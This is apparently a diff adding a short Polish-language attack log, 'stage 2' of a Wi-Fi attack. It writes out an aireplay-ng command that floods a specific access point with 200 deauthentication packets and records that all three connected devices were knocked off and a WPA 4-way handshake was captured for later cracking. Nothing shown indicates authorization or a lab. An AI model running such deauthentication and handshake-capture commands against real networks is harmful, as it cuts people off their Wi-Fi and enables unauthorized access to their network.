@@ -1,0 +1,11 @@
+# ETAP 2 — Deauth broadcast na wszystkie urzadzenia
+## Komenda
+timeout 30 aireplay-ng --deauth 200 -a 7C:F1:7E:C1:7B:95 wlan0
+## Wynik
+Wyslano 200 pakietow deauth (code 7) broadcast.
+Skan po deauth: BRAK urzadzen podlaczonych do 601A.
+Wszystkie 3 urzadzenia ROZLACZONE.
+## WPA Handshake
+PRZECHWYCONY 4-way handshake dla 7C:F1:7E:C1:7B:95.
+## Notatki
+Deauth zadzialal. Injection na karcie dziala (100% success rate po reloadzie drivera rt2800usb).
